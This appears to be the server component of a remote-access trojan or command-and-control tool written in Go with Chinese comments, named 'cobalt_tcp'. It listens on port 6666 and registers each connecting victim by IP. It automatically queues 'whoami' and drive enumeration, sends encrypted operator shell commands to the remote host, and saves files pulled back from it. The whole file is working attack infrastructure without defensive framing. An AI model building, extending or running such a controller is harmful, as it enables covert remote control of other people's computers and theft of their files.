package cobalt_tcp

import (
	cobalt_crypto "My-Comment/cobalt.crypto"
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"regexp"
	"runtime"
	"strings"
	"time"
)

var DEBUG bool = true
var OPENIP bool = true //是否只按照ip地址区分客户端
var ReadOrWrite = "Read"
var Computer = runtime.GOOS //
var MaxConnect = 30         // 定义最大连接数量
var MaxChanSize = 10        //默认每个命令通道的大小
var MaxMagString = 5000     //默认每次接受命令的大小

type HOSTS struct {
	Ip        string
	Chans     chan string
	Time      string
	Living    string
	ChansBack chan string
	Whoami    string
	Disk      []string
	file      string
}

var IpChanMap = make(map[int]HOSTS, MaxConnect)

func MyListen() (net.Listener, error) {
	return net.Listen("tcp", ":6666")
}
func (hosts *HOSTS) UseCmd() {
	var b string
	reader := bufio.NewReader(os.Stdin) // 确保得到空行

	fmt.Printf("使用quit退出\n")
	if Computer == "windows" {
		fmt.Scanf("%s", &b)
	}

	for {
		fmt.Printf(">")
		a, _ := reader.ReadString('\n')
		if strings.Index(a, "quit") == 0 {
			break
		}
		if DEBUG {
			fmt.Printf("user cmd :%s\n", a)
		}

		hosts.Chans <- "Cmd\r\n" + a
		//b = <-hosts.chansBack
		//fmt.Printf("\n%s", b)
	}
}
func (hosts *HOSTS) SetCmd(string2 string) {
	cmd := "Cmd\r\n" + string2
	hosts.Chans <- cmd
	//backs := <-hosts.chansBack
	fmt.Printf("\n")
	//fmt.Printf("%s", backs)
}
func (_ HOSTS) Listener(listener net.Listener) {

	for {

		conn, err := listener.Accept()
		if err != nil {
			fmt.Println(err)
			return
		}
		// 检测地址是否被保存过
		// 检测该端口是否存在过，如果不存在，就标记并传入通道，反之就创建通道，记录并传入
		ip := conn.RemoteAddr().String()
		if OPENIP {
			reg := regexp.MustCompile(`\d*\.\d*\.\d*\.\d`)
			ip = reg.FindString(ip)
		}
		_, cmd := addip(ip)
		//_ = conn.SetReadDeadline(Time.Time{}.Add(Time.Second * 60))
		//ipchan[i] = *cmd
		go PutMsgs(conn, cmd) //复制传输，所以传输后conn的值改变也无妨
		if DEBUG {
			fmt.Printf("启动传输协程完成")
		}

	}
}

func PutMsgs(conn net.Conn, cmd int) {
	// 用于向客户端发送请求的函数
	regstringCmd := "\\ACmd\\r\\n"
	regCmd := regexp.MustCompile(regstringCmd)
	regstring := "\\ADocument"
	reg := regexp.MustCompile(regstring)
	go GetMsg(conn, cmd) //启动接受消息协程
	if DEBUG {
		fmt.Printf("启动接受协程完成")
	}
	for {
		Sends := ""
		Sends = <-IpChanMap[cmd].Chans
		if DEBUG {
			//fmt.Printf("PUT")
		}

		if regCmd.FindString(Sends) == "Cmd\r\n" {
			//defer conn.Close()
			if DEBUG {
				fmt.Printf("Cmd ： %s\n", []byte(Sends))
			}
			b, err1 := cobalt_crypto.Encode([]byte(Sends))
			if err1 != nil {
				fmt.Printf("cmd加密失败")
				log.Println(err1)
			}
			n1, err := conn.Write([]byte(b)) //写入数据
			if DEBUG {
				fmt.Printf("put num = %d\n", n1)
			}
			if err != nil {
				// 信息发送失败报错位置
				fmt.Printf("发送信息错误2\n")
				log.Println(err)
				if DEBUG {
					fmt.Printf("发送服务协程退出")
				}
				return
			}

			temp := IpChanMap[cmd]
			temp.Time = time.Now().Format("01-02 15:04:05")
			IpChanMap[cmd] = temp
		} else if reg.FindString(Sends) == "Document" {
			if DEBUG {
				fmt.Printf("原文：%s\n", Sends)
			}
			file := Sends[8:]
			if DEBUG {
				fmt.Printf("发送内容：%s\n", file)
			}
			b, err1 := cobalt_crypto.Encode([]byte(file))
			if err1 != nil {
				fmt.Printf("document加密失败")
				log.Println(err1)
			}
			n1, err := conn.Write([]byte(b)) //写入数据
			if DEBUG {
				fmt.Printf("put num = %d\n", n1)
			}
			if err != nil {
				// 信息发送失败报错位置S
				fmt.Printf("发送信息错误2\n")
				log.Println(err)
				if DEBUG {
					fmt.Printf("发送服务协程退出")
				}
				return
			}

			temp := IpChanMap[cmd]
			temp.Time = time.Now().Format("01-02 15:04:05")
			IpChanMap[cmd] = temp

		}
	}

}
func ReadCmd() {
	ReadOrWrite = "Read"
}
func WriteCmd() {
	ReadOrWrite = "Write"
}
func addip(ip string) (*HOSTS, int) {
	var host *HOSTS
	i := 1
	lens := len(IpChanMap) + 1
	for i < lens {

		if IpChanMap[i].Ip == ip {
			hostTme := IpChanMap[i]
			host = &hostTme
			return host, i
		}
		i++
	}

	if i == lens {
		Chans := make(chan string, MaxChanSize)
		chansBack := make(chan string, MaxChanSize)
		Chans <- "Cmd\r\nwhoami"
		Chans <- "DocumentDisk\r\n"

		temp_host := HOSTS{
			ip,
			Chans,
			time.Now().Format("01-02 15:04:05"),
			"60s",
			chansBack,
			"",
			make([]string, 1),
			"default",
		}
		IpChanMap[i] = temp_host
		//hostTme := ipChanMap[i]
		host = &temp_host
	}

	return host, i

}

func (hosts HOSTS) PrintHost(i int) {
	fmt.Printf("%d\t%s\t%s\t\t%s\t %s\n", i+1, hosts.Ip, hosts.Time,
		time.Now().Format("01-02 15:04:05"), hosts.Living)
}

func GetMsg(conn net.Conn, hosts int) {
	regstring := "\\ADocument\\r\\n"
	regAlive := "\\AAlive\\r\\n"
	regDiskString := "\\ADisk\\r\\n"
	regA := regexp.MustCompile(regAlive)
	reg := regexp.MustCompile(regstring)
	regDisk := regexp.MustCompile(regDiskString)
	GetMsg := make([]byte, MaxMagString*4)
	n, err := conn.Read(GetMsg)
	if err != nil {
		// 信息发送失败报错位置
		fmt.Printf("接受whoami错误3\n")
		log.Println(err)

	}
	if DEBUG {
		fmt.Printf("打印接受的whoami：%s\n", string(GetMsg[:n]))
	}
	// 解码位置
	temp1, _ := cobalt_crypto.DecodeToString(GetMsg[:n])
	strings.Replace(temp1, "\\n", "", -1)
	host1 := IpChanMap[hosts]
	host1.Whoami = temp1
	IpChanMap[hosts] = host1
	//hosts.chansBack <- hosts.Whoami
	if DEBUG {
		fmt.Printf("打印赋值的whoami: %s\n", IpChanMap[hosts].Whoami)
	}
	if DEBUG {
		fmt.Printf("whoami: %s\n", GetMsg)
	}
	for {
		//fmt.Printf("GET")
		n1, err1 := conn.Read(GetMsg)
		if err1 != nil {
			fmt.Printf("接受错误4\n")
			log.Println(err1)
			return
		}
		//b, err2 := SocketToUtf8(GetMsg[:n1])
		b, err2 := cobalt_crypto.DecodeToString(GetMsg[:n1]) // 解码位置
		//b := string(GetMsg[:n1])
		//var err2 error = nil
		if err2 != nil {
			fmt.Printf("转换失败：\n")
			log.Println(err2)
		}

		if regA.FindString(b) == "Alive\r\n" {
			if DEBUG {
				//fmt.Printf("收到心跳包")
			}
			temp := IpChanMap[hosts]
			temp.Time = time.Now().Format("01-02 15:04:05")
			IpChanMap[hosts] = temp
		} else if reg.FindString(b) == "Document\r\n" {
			file := b[10:n1]
			//data, _ := ioutil.ReadAll(transform.NewReader(bytes.NewReader([]byte(file)), simplifiedchinese.GBK.NewEncoder()))

			filename := <-IpChanMap[hosts].ChansBack

			if filename == "" {
				filename = IpChanMap[hosts].file
			}
			if DEBUG {
				fmt.Printf("当前文件名称：%s", filename)
			}
			ioutil.WriteFile(filename, []byte(file), 0664)
			fmt.Printf("\n文件保存完成\n")
			temp := IpChanMap[hosts]
			temp.Time = time.Now().Format("01-02 15:04:05")
			IpChanMap[hosts] = temp
		} else if regDisk.FindString(b) == "Disk\r\n" {
			var disknum int
			b = strings.Replace(b, "\r\n", " ", -1)
			if DEBUG {
				fmt.Printf("替换后：%s\n", b)
			}
			n, _ := fmt.Sscanf(b, "Disk %d\n", &disknum)
			if n != 1 {
				fmt.Printf("Disk接收失败")
				if DEBUG {
					fmt.Printf("n = %d\n", n)
				}
				log.Println(err)
			}
			temp := IpChanMap[hosts] //确保只增加1次
			capt := cap(temp.Disk) == 1
			for i := 1; i <= 10; i++ {
				if ((disknum >> i) & 1) == 1 {
					if DEBUG {
						fmt.Printf("当前盘符cap ：%d 盘符len：%d", cap(temp.Disk), len(temp.Disk))
					}
					if capt {
						if DEBUG {
							fmt.Printf("成功编辑盘符\n")
						}
						temp.Disk = append(temp.Disk, string(65+i))
					}
					if DEBUG {
						fmt.Printf("GET_存在盘符%s:\n", string(65+i))
					}

				}
			}
			temp.Time = time.Now().Format("01-02 15:04:05")
			IpChanMap[hosts] = temp

		} else {
			if DEBUG {
				fmt.Printf("收到消息\n")
			}

			fmt.Printf("%s", b)
			if DEBUG {
				fmt.Printf("当前心跳：%s\n", IpChanMap[hosts].Time)
			}
			fmt.Printf("\n")
			if DEBUG {
				//fmt.Printf("data 打印完毕")
			}
			temp := IpChanMap[hosts]
			temp.Time = time.Now().Format("01-02 15:04:05")
			IpChanMap[hosts] = temp
		}

	}
}
